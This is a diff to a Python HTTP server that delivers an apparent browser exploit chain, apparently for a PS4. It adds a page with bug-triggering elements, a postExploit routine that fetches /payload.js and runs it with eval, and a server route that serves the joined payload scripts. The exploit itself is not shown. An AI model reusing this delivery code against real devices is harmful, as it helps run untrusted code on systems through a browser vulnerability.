@@ -2,13 +2,30 @@ import socketserver, http.server, threading, queue
 
 INDEX_HTML = b'''\
 <html>
-<body>
+<body onload="go()">
 <script>
 function print(){}
+
+window.postExploit = function()
+{
+    var xhr = new XMLHttpRequest();
+    xhr.open('GET', '/payload.js', true);
+    xhr.send('');
+    xhr.onload = function()
+    {
+        eval.call(window, xhr.responseText);
+    }
+};
 </script>
-<script src="/exploit.js"></script>
-<script src="/helpers.js"></script>
-<script src="/server.js"></script>
+<script src="/external/utils.js"></script>
+<script src="/external/int64.js"></script>
+<script src="/external/ps4.js"></script>
+<button id="input1" onfocus="handle2()"></button>
+<button id="input2"></button>
+<button id="input3" onfocus="handle2()"></button>
+<select id="select1">
+<option value="value1">Value1</option>
+</select>
 </body>
 </html>
 '''
@@ -25,9 +42,12 @@ class RequestHandler(http.server.BaseHTTPRequestHandler):
         self.end_headers()
         self.wfile.write(data)
     def do_GET(self):
-        if self.path == '/': ans = INDEX_HTML
-        elif self.path in ('/exploit.js', '/helpers.js'): ans = open('..'+self.path, 'rb').read()
-        elif self.path == '/server.js': ans = open('server.js', 'rb').read()
+        if self.path == '/':
+            ans = INDEX_HTML
+        elif self.path.startswith('/external') and '..' not in self.path:
+            ans = open('..'+self.path, 'rb').read()
+        elif self.path == '/payload.js':
+            ans = open('../helpers.js', 'rb').read()+b'\n'+open('server.js', 'rb').read()
         else:
             self.send_error(404)
             return
